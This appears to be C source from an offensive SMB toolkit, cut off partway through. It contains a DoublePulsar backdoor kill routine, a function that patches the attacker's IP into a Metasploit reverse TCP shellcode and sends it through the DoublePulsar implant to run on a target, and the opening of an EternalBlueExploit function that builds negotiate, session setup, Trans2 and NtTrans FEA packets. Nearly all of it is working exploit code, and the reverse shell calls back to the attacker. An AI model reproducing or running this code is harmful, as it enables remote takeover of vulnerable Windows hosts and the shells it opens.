		set_mid(&info, GetUshort(&tmpmid) - DOPU_ERROR_SUCCESS);
		//reset special mid
		set_special_mid(&info, 0);

		bstatus = SendRecvTrans2SessionSetupKill(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);

		PutUshort(&tmpmid, get_mid(&info));
		tmpmid += DOPU_ERROR_SUCCESS;
		set_special_mid(&info, GetUlong(&tmpmid));

		update_smb_info(&info, &resp->ThisPacket);

		if (get_mid(&info) == get_special_mid(&info))
			_dbgprint("[%S]: doublepulsar backdoor successfully killed...\n", __FUNCTION__);
		else
			dbgprint("[%S]: double pulsar uninstall may have been unsuccessful...\n", __FUNCTION__);

		req = req->NextEntry;
		resp = resp->NextEntry;

		//revert multiplex ID to original value
		set_mid(&info, GetUshort(&tmpmid) - DOPU_ERROR_SUCCESS);
		//reset special mid
		set_special_mid(&info, 0);

	smbdisconnect:
		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;
	} while (FALSE);

	PutUlong(status, ((bstatus == TRUE) ? 0 : info.srv_last_error));

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------REQUEST INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(req->ThisSmb->Command));

		switch (req->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}

		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Uid));
		wprintf(L"SMB tree ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Tid));

		DumpHex(req->ThisPacket.pbdata, req->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------RESPONSE INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(resp->ThisSmb->Command));
		wprintf(L"SMB NTSTATUS:\t0x%08X\n", GetUnsigned(&resp->ThisSmb->Status.NtStatus));

		switch (resp->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}
		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Uid));
		wprintf(L"SMB Tree ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Tid));
		DumpHex(resp->ThisPacket.pbdata, resp->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}



	goto cleanup;

cleanup:
	resp = responses;
	
	//close socket and cleanup
	if (validsock(GetSocket(s)))
		closesocket(GetSocket(s));
	WSACleanup();

	//start at begining of lists
	req = requests;
	resp = responses;
	//free buffers
	FreeRequestLinkedListBuffers(req, &numberofreqentries);
	FreeResponseLinkedListBuffers(resp, &numberofrespentries);
	FreeUnicodeString(&wip);
	FreeString(&ip);

	return GetUlong(status);

}

DWORD __stdcall DoublePulsarExecuteShellcode(PVOID pvip)
{
	BUFFER tmp = { 0 }, shellcode = { 0 };
	PCSTR paramip = (PCSTR)pvip;
	UNICODE_STRING wip = { 0 }, shellcodefilename = { 0 };
	STRING ip = { 0 };
	static smb_info info;
	static RequestPacketLinkedList requests[0x20], * req;
	static ResponsePacketLinkedList responses[0x20], * resp;
	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x20, leakentrycount = 0x8, attempts = 3, groomcount = 0, numberofrespentries = 0x20, numberoftransentries = 8;
	WORD tmpmid = 0;
	SOCKET s[2] = { 0 };
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
	BOOLEAN bstatus = 0;
	static ANYPOINTER any;
	static DWORD smbrequestandresponsecount;
	static BYTE newshellcodeipraw[sizeof(DWORD)];
	PTRANS_REQUEST_LIST transactionreqlist = NULL, transreqentry = NULL;
	PTRANS_RESPONSE_LIST transactionresplist = NULL, transrespentry = NULL;

	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);
	InitString(ThisMachinesIpAddress.Buffer, &info.AttackingIPAddress);
	//InitUnicodeString(DOUBLE_PULSAR_SHELLCODE_TO_EXECUTE_FILENAME, &shellcodefilename);

	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	info.connection_handle += (random() % 0x1000);

	set_pid(&info, 65279);
	set_mid(&info, 64);
	set_tid(&info, 0);
	set_uid(&info, 0);

	//setup request list

	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		req = &requests[i];
		j = (i + 1);
		if (j == numberofreqentries)
		{
			req->NextEntry = NULL;
		}
		else if (j < numberofreqentries)
		{
			req->NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup response list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		resp = (responses + i), j = (i + 1);

		if (j == numberofrespentries)
		{
			resp->NextEntry = NULL;
		}
		else if (j < numberofrespentries)
		{
			resp->NextEntry = (responses + j);
		}
	}
	resp = responses;

	/*	
	if (!readfile(&shellcodefilename, &shellcode))
	{
		if (notnull(ip.Buffer))
			FreeString(&ip);
		if (notnull(wip.Buffer))
			FreeUnicodeString(&wip);
	
		
		PutUlong(status, ((GetLastError() != 0) ? GetLastError() : STATUS_FAIL));

		errmsg(__FUNCTION__, __LINE__, GetUlong(status));
		dbgprint("[%S]: SMBLibrary.dll!readfile failed on line %u", __FUNCTION__, __LINE__);
		
		return GetUlong(status);
	}
	*/

	//copy our shellcode from read only memory
	bwsalloc(&shellcode, METASPLOIT_REVERSE_TCP_SHELL_SIZE);
	cpy(shellcode.pbdata, METASPLOIT_REVERSE_TCP_SHELL, shellcode.dwsize);
	
	//copy our ip address from a global variable
	bwsalloc(&tmp, info.AttackingIPAddress.MaximumLength);
	cpy(tmp.pbdata, info.AttackingIPAddress.Buffer, info.AttackingIPAddress.Length);


	//we do all of the following to convert the ip address string to it's 4 byte representation in hex
	if (!find_memory_pattern(&tmp, &any, ".", sizeof(BYTE)))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		bwsfree(&tmp);
		return GetUlong(status);
	}

	*(any.ppointer) = '\0';

	if (!find_memory_pattern(&tmp, &any, ".", sizeof(BYTE)))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		bwsfree(&tmp);
		return GetUlong(status);
	}

	*(any.ppointer) = '\0';

	if (!find_memory_pattern(&tmp, &any, ".", sizeof(BYTE)))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		bwsfree(&tmp);
		return GetUlong(status);
	}

	*(any.ppointer) = '\0';

	any.pvpointer = tmp.pbdata;
	newshellcodeipraw[0] = LOBYTE(atol(any.ppointer));

	while (*(any.ppointer) != 0x00)
		any.address++;

	any.address++;
	newshellcodeipraw[1] = LOBYTE(atol(any.ppointer));

	while (*(any.ppointer) != 0x00)
		any.address++;

	any.address++;
	newshellcodeipraw[2] = LOBYTE(atol(any.ppointer));
	
	while (*(any.ppointer) != 0x00)
		any.address++;

	any.address++;
	newshellcodeipraw[3] = LOBYTE(atol(any.ppointer));

	RtlZeroMemory(&any, sizeof(any));
	bwsfree(&tmp);

	if (!find_memory_pattern(&shellcode, &any, "\x7f\x00\x00\x01", 4))
	{
		PutUlong(status, STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		bwsfree(&shellcode);
		return GetUlong(status);
	}

	RtlZeroMemory(any.pbpointer, sizeof(newshellcodeipraw));
	RtlCopyMemory(any.pbpointer, newshellcodeipraw, sizeof(newshellcodeipraw));
	

	//try to get double pulsar to execute shellcode on our target machine without crashing it!
	do
	{
		if (!AllocateAndSetupTransactionRequestList(&transactionreqlist, GetUlong(&numberoftransentries)))
		{
			if (!GetLastError())
				PutUlong(status, STATUS_NO_MEMORY), SetLastError(GetUlong(status));
			else
				PutUlong(status, GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			bwsfree(&shellcode);
			bstatus = FALSE;
			break;
		}

		transreqentry = transactionreqlist->Flink;

		if (!AllocateAndSetupTransactionResponseList(&transactionresplist, GetUlong(&numberoftransentries)))
		{
			if (!GetLastError())
				PutUlong(status, STATUS_NO_MEMORY), SetLastError(GetUlong(status));
			else
				PutUlong(status, GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			bwsfree(&shellcode);
			FreeTransactionRequestList(&transactionreqlist);
			bstatus = FALSE;
			break;
		}

		transrespentry = transactionresplist->Flink;

		PutUnsigned(connectstatus, TargetConnect(GetSocket(s), *sa, wsa, ip.Buffer, GetUnsigned(status)));

		if ((GetUlong(connectstatus) != 0) || (GetUlong(status) != 0))
		{
			dbgprint("[%S]: %S could not connect to the target %ws:%u...\n", __FUNCTION__, "TargetConnect", wip.Buffer, 445U);
			bstatus = FALSE;
			break;
		}

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
		{
#ifdef _DEBUG
			errmsg(__FUNCSIG__, __LINE__, WSAGetLastError() | info.srv_last_error);
#endif
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;


		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s), &info, wip.Buffer);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (info.srv_last_error & STATUS_FAIL)
			break;

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//send TRANSACTION2 SESSION_SETUP request to trigger double pulsars overwritten SESSION_SETUP handler function pointer
		bstatus = SendRecvTrans2SessionSetup(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		FillInTransactionRequestListEntry(transreqentry, req);
		FillInTransactionResponseListEntry(transrespentry, resp);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (GetUshort(&req->ThisSmb->Mid) != (GetUshort(&resp->ThisSmb->Mid) - DOPU_ERROR_SUCCESS))
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//revert multiplex ID to original value
		set_mid(&info, GetUshort(&transreqentry->smb->Mid));	//set_mid(&info, GetUshort(&tmpmid) - DOPU_ERROR_SUCCESS);

		//send exec shellcode SMB Trans2 SESSION_SETUP packet to double pulsar
		bstatus = SendRecvTrans2SessionSetupExec(req, resp, GetSocket(s), &info, (&(resp - 1)->ThisPacket), &shellcode);
		++smbrequestandresponsecount;
		
		if ((notnull(req->ThisPacket.pbdata) && isnull(req->ThisSmb)) && (notnull(resp->ThisPacket.pbdata) && isnull(resp->ThisSmb)))
		{
			req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
			resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
			req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
			resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		}

		FillInTransactionRequestListEntry(transreqentry, req);
		FillInTransactionResponseListEntry(transrespentry, resp);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);
		
		//set tmp mid to dopu status code from server's backdoor
		PutUshort(&tmpmid, (GetUshort(&resp->ThisSmb->Mid) - GetUshort(&req->ThisSmb->Mid)));

		if (!cmp(resp->ThisSmb->Protocol, "\xFFSMB", 4))
		{
			PutUlong(status, NT_STATUS_INVALID_SMB);
			SetLastError(GetUlong(status));
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			break;
		}

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_NOT_IMPLEMENTED)
		{
			PutUlong(status, GetUlong(&resp->ThisSmb->Status.NtStatus));
			SetLastError(GetUlong(status));			
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			break;
		}

		if (GetUshort(&tmpmid) != DOPU_ERROR_SUCCESS)
		{
			PutUlong(status, (DWORD)(tmpmid));
			SetLastError(GetUlong(status));
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
			dbgprint("[%S] error code recieved from double pulsar backdoor: 0x%X\n", __FUNCSIG__, GetUnsigned(status));
			break;
		}

		bstatus = SendRecvTreeDisconnect(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		bstatus = SendRecvLogoffAndx(req, resp, GetSocket(s), &info);
		++smbrequestandresponsecount;

		req->ThisSmb = MAKEPSMB(req->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		resp->ThisSmb = MAKEPSMB(resp->ThisPacket.pbdata + SMB_HEADER_OFFSET);
		req->ThisNetbiosSize = (req->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);
		resp->ThisNetbiosSize = (resp->ThisPacket.pbdata + NETBIOS_SIZE_OFFSET);

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;
	} while (FALSE);

	PutUlong(status, ((bstatus == TRUE) ? 0 : info.srv_last_error));

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------REQUEST INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(req->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(req->ThisSmb->Command));

		switch (req->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}

		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Uid));
		wprintf(L"SMB tree ID:\t%u\n", MAKEUNSIGNED(req->ThisSmb->Tid));

		DumpHex(req->ThisPacket.pbdata, req->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}

	for (i = 0; i < smbrequestandresponsecount; i++)
	{
		req = &requests[i];
		resp = &responses[i];
		wprintf(L"------------------RESPONSE INFO-------------------\n\n");
		wprintf(L"Netbios Length:\t0x%04X (%u bytes)\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))), MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize))));
		wprintf(L"Total packet Size:\t%u bytes\n", MAKEUNSIGNED(byteswap16(GetUshort(resp->ThisNetbiosSize)) + sizeof(DWORD)));
		wprintf(L"SMB Command:\t0x%02X\n", MAKEUNSIGNED(resp->ThisSmb->Command));
		wprintf(L"SMB NTSTATUS:\t0x%08X\n", GetUnsigned(&resp->ThisSmb->Status.NtStatus));

		switch (resp->ThisSmb->Command)
		{
		case SMB_COM_NEGOTIATE:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NEGOTIATE");
			break;

		case SMB_COM_SESSION_SETUP_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_SESSION_SETUP_ANDX");
			break;

		case SMB_COM_TREE_CONNECT:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_TREE_CONNECT_ANDX");
			break;

		case SMB_COM_NT_CREATE_ANDX:
			wprintf(L"SMB Type:\t%S\n", "SMB_COM_NT_CREATE_ANDX");
			break;

		default:
			break;
		}
		wprintf(L"SMB process ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Pid));
		wprintf(L"SMB multiplex ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Mid));
		wprintf(L"SMB user ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Uid));
		wprintf(L"SMB Tree ID:\t%u\n", MAKEUNSIGNED(resp->ThisSmb->Tid));
		DumpHex(resp->ThisPacket.pbdata, resp->ThisPacket.dwsize);
		wprintf(L"\n\n");
	}



	goto cleanup;

cleanup:

	if (info.DoublePulsarInstalled)
		PutUlong(status, 0);
	else
		PutUlong(status, STATUS_FAIL);

	resp = responses;
	if (GetUlong(status) == 0)
		_dbgprint("[+] double pulsar xor key:\t0x%08X\n", MAKEUNSIGNED(GetDoublePulsarXorKey(&responses[3].ThisPacket)));

	//close socket and cleanup
	if (validsock(GetSocket(s)))
		closesocket(GetSocket(s));
	WSACleanup();

	//start at begining of lists
	req = requests;
	resp = responses;
	//free buffers
	FreeRequestLinkedListBuffers(req, &numberofreqentries);
	FreeResponseLinkedListBuffers(resp, &numberofrespentries);
	FreeUnicodeString(&wip);
	FreeString(&ip);
	FreeString(&info.AttackingIPAddress);
	FreeString(&info.tree_connect_andx_svc);
	FreeUnicodeString(&info.tree_connection);
	if (notnull(shellcode.pbdata))
		bwsfree(&shellcode);
	return GetUlong(status);
}

DWORD __stdcall EternalBlueExploit(PVOID pvip)
{
	BUFFER tmp = { 0 };
	PCSTR paramip = (PCSTR)pvip;
	UNICODE_STRING wip = { 0 };
	STRING ip = { 0 };
	static smb_info info, sessionsetupinfo[2];
	static RequestPacketLinkedList requests[0x40], * req;
	static ResponsePacketLinkedList responses[0x40], * resp;
	DWORD i = 0, j = 0, currententryval = 0, numberofreqentries = 0x40, leakentrycount = 0, attempts = 3, groomcount = 12, numberofrespentries = 0x40, numberoftransentries = 0x40, numberofsockets = 0x10, socketindex = 0;
	WORD tmpmid = 0;
	SOCKET* s = NULL, * allocconnection = NULL, * holeconnection = NULL, * srvnetconnections = NULL;
	WSAData wsa = { 0 };
	sockaddr_in sa[2] = { 0 };
	unsigned status[0x10] = { 0 }, * connectstatus = (status + 1);
	BOOLEAN bstatus = 0;
	static ANYPOINTER any;
	static DWORD smbrequestandresponsecount;
	TRANS_REQUEST_LIST* transactionlist = NULL, * transentry = NULL;
	TRANS_RESPONSE_LIST* transresplist = NULL, * transrespentry = NULL;
	send_and_recieve_handler_type_one SendRecvSmbHandler = NULL;


	InitString(paramip, &ip);
	ConvertStringToUnicode(&ip, &wip);

	if (!AllocateSockets(&s, numberofsockets))
	{
		FreeString(&ip);
		FreeUnicodeString(&wip);
		return GetLastError();
	}


	info.sockaddrpointer = sa;
	info.socketpointer = s;
	info.wsapointer = &wsa;

	info.connection_handle += (random() % 0x1000);

	set_pid(&info, 65279);
	set_mid(&info, 64);
	set_tid(&info, 0);
	set_uid(&info, 0);

	//setup request list

	for (i = 0, j = 0; i < numberofreqentries; i++)
	{
		req = &requests[i];
		j = (i + 1);
		if (j == numberofreqentries)
		{
			req->NextEntry = NULL;
		}
		else if (j < numberofreqentries)
		{
			req->NextEntry = &requests[j];
		}
	}

	req = requests;

	//setup response list
	for (i = 0, j = 0; i < numberofrespentries; i++)
	{
		resp = (responses + i), j = (i + 1);

		if (j == numberofrespentries)
		{
			resp->NextEntry = NULL;
		}
		else if (j < numberofrespentries)
		{
			resp->NextEntry = (responses + j);
		}
	}
	resp = responses;

	for(j = 0; j < attempts; j++)
	{

		if (!AllocateAndSetupTransactionRequestList(&transactionlist, numberoftransentries))
		{
			FreeSockets(s);
			PutUlong(status, STATUS_NO_MEMORY | GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			FreeString(&ip);
			FreeUnicodeString(&wip);
			return GetUlong(status);
		}

		if (!AllocateAndSetupTransactionResponseList(&transresplist, numberoftransentries))
		{
			FreeSockets(s);
			PutUlong(status, STATUS_NO_MEMORY | GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			FreeString(&ip);
			FreeUnicodeString(&wip);
			FreeTransactionRequestList(&transactionlist);
			return GetUlong(status);
		}

		transentry = transactionlist;
		transrespentry = transresplist;
		
		PutUnsigned(status, TargetConnect(GetSocket(s + 0), *sa, wsa, ip.Buffer, GetUnsigned(status + 1)));

		if (GetUlong(status) != 0)
		{
			FreeSockets(s);
			PutUlong(status, STATUS_NO_MEMORY | GetLastError());
			errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
			dbgprint("[%S]: failed to connect to target %S:%u with wserror 0x%08X and status 0x%08X\n", __FUNCTION__, ip.Buffer, 445, MAKEUNSIGNED(WSAGetLastError()), GetUnsigned(status));
			FreeString(&ip);
			FreeUnicodeString(&wip);
			FreeTransactionRequestList(&transactionlist);
			FreeTransactionResponseList(&transresplist);
			return ((WSAGetLastError() != 0) ? (DWORD)WSAGetLastError() : GetUlong(status));
		}

		bstatus = SendRecvNegotiate(req, resp, GetSocket(s + socketindex), &info);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;
		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//send regular sessionsetupandx smb command
		bstatus = SendRecvSessionSetupAndx(req, resp, GetSocket(s + socketindex), &info);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;
		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		//treeconnect to IPC$ share
		bstatus = SendRecvTreeConnectAndx(req, resp, GetSocket(s + socketindex), &info, wip.Buffer);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != 0)
			break;
		if (!bstatus)
			break;

		req = req->NextEntry;
		resp = resp->NextEntry;

		
		set_mid(&info, 65);
		bstatus = SendRecvTrans2SessionSetup(req, resp, GetSocket(s + socketindex), &info);
		++smbrequestandresponsecount;

		if (!bstatus)
			break;

		update_smb_info(&info, &req->ThisPacket);
		//skip updating response info i guess

		FillInTransactionRequestListEntry(transentry, req);
		FillInTransactionResponseListEntry(transrespentry, resp);

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_NOT_IMPLEMENTED)
		{
			errmsg(__FUNCTION__, __LINE__, STATUS_FAIL);
			break;
		}

		PutUshort(&tmpmid, get_mid(&info) + DOPU_ERROR_SUCCESS);

		if (GetUshort(&tmpmid) == GetUshort(&resp->ThisSmb->Mid))
		{
			info.DoublePulsarInstalled = TRUE;
			break;
		}

		req = req->NextEntry;
		resp = resp->NextEntry;
		transentry = transentry->Flink;
		transrespentry = transrespentry->Flink;

		bstatus = SendRecvNtTransFirstFea(req, resp, GetSocket(s + socketindex), &info);
		++smbrequestandresponsecount;

		update_smb_info(&info, &req->ThisPacket);
		update_smb_info(&info, &resp->ThisPacket);

		if (!bstatus)
			break;

		if (GetUlong(&resp->ThisSmb->Status.NtStatus) != NT_STATUS_SUCCESS)
			break;

		FillInTransactionRequestListEntry(transentry, req);
		FillInTransactionResponseListEntry(transrespentry, resp);
	
		req = req->NextEntry;
		resp = resp->NextEntry;
		transentry = transentry->Flink;
